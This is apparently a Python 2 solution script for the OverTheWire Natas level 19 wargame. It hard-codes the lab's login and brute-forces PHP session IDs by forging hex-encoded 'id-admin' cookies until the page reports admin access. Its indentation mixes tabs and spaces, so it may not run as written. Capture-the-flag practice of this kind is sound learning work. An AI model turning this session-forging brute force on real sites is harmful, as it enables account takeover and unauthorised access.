import requests

DASH = "2d"
URL = "http://natas19.natas.labs.overthewire.org/?username=admin&passwords=a&debug"
CREDS = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
PHPSESSID = "PHPSESSID"
SUCCESS = "You are an admin"
ADMIN = "admin"

s = requests.Session()
s.auth = CREDS

cookie = {PHPSESSID: 0}

def cookie_to_text(cookie):
	"""
	Isn't perfect, but enough to understand cookie format
	"""
        text = ""
        hex_codes = ["0x" + cookie[i:i+2] for i in range(0, len(cookie), 2)]
        for code in hex_codes:
                text += chr(int(code, 16))
        
        return text[::-1]


def generate_cookie(username, brute_id):
        reverse_user = username[::-1]
        reverse_id = str(brute_id)[::-1]
        
        cookie = "".join([hex(ord(i))[2:] for i in reverse_id])
        cookie += DASH
        cookie += "".join([hex(ord(i))[2:] for i in reverse_user][::-1])
        return cookie

for i in xrange(1000):
	cookie[PHPSESSID] = generate_cookie(ADMIN, i)
	data = s.get(URL, cookies=cookie).text
	if SUCCESS in data:
		print "%s: %s" %(PHPSESSID, str(i))
		print data
		break
